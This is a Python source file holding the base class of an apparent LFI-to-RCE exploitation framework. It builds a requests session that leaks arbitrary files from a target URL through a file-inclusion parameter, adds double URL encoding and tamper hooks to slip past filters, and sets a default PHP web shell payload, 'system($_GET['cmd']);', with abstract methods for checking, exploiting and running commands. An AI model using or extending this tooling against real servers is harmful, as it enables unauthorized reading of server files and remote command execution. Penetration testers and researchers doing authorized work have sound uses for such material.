"""
Base class for LFI to RCE techniques.
"""

import logging
import abc
import typing as t
import requests
from urllib.parse import quote, urljoin

from ..exceptions import TechniqueError, ExecutionError

logger = logging.getLogger("elle-est-fit")


class TechniqueBase(abc.ABC):
    """
    Base class for all LFI to RCE techniques.
    
    Each technique should implement the abstract methods to provide
    its specific exploitation logic.
    """
    
    name = "base"  # Override in subclasses
    description = "Base technique class"  # Override in subclasses
    
    def __init__(
        self,
        target: str = None,
        leak_function: t.Callable[[str], str] = None,
        double_url_encode: bool = False,
        tamper: t.Callable[[str], str] = None,
        php_code: str = None
    ):
        """
        Initialize the technique.
        
        Args:
            target: Target URL with LFI vulnerability
            leak_function: Custom function that takes a filename and returns its contents
            double_url_encode: Whether to apply double URL encoding
            tamper: Custom function to modify the LFI parameter
            php_code: Custom PHP code to execute instead of default shells
        """
        self.target = target
        self.leak_function = leak_function or self._default_leak_function
        self.double_url_encode = double_url_encode
        self.tamper = tamper
        self.php_code = php_code or "system($_GET['cmd']);"
        self.shell_path = None
        self.session = requests.Session()
        
        # Set a reasonable timeout for requests
        self.timeout = 10
        
        # Add a useful user-agent
        self.session.headers.update({
            'User-Agent': 'Elle-Est-Fit LFI Framework'
        })
    
    def _default_leak_function(self, filename: str) -> str:
        """
        Default implementation of the leak function using the target URL.
        
        Args:
            filename: Path to the file to leak
            
        Returns:
            Contents of the file if successful, empty string otherwise
        """
        if not self.target:
            raise TechniqueError("No target URL provided and no custom leak function defined")
        
        # Prepare the filename
        encoded_filename = self._encode_filename(filename)
        
        # Make the request
        try:
            response = self.session.get(
                f"{self.target}{encoded_filename}",
                timeout=self.timeout
            )
            if response.status_code == 200:
                return response.text
            else:
                logger.debug(f"Failed to leak file {filename}: HTTP {response.status_code}")
                return ""
        except requests.RequestException as e:
            logger.debug(f"Request error when trying to leak {filename}: {str(e)}")
            return ""
    
    def _encode_filename(self, filename: str) -> str:
        """
        Encode the filename according to the configuration.
        
        Args:
            filename: Raw filename to encode
            
        Returns:
            Encoded filename
        """
        encoded = filename
        
        # Apply URL encoding
        encoded = quote(encoded)
        if self.double_url_encode:
            encoded = quote(encoded)
        
        # Apply custom tamper function if provided
        if self.tamper:
            encoded = self.tamper(encoded)
        
        return encoded
    
    @abc.abstractmethod
    def check(self) -> bool:
        """
        Check if the technique is viable for the target.
        
        Returns:
            True if the technique appears viable, False otherwise
        """
        pass
    
    @abc.abstractmethod
    def exploit(self) -> bool:
        """
        Exploit the LFI vulnerability to achieve RCE.
        
        Returns:
            True if successful, False otherwise
        """
        pass
    
    @abc.abstractmethod
    def execute(self, command: str) -> str:
        """
        Execute a command via the established RCE.
        
        Args:
            command: Command to execute
            
        Returns:
            Command output
        """
        pass
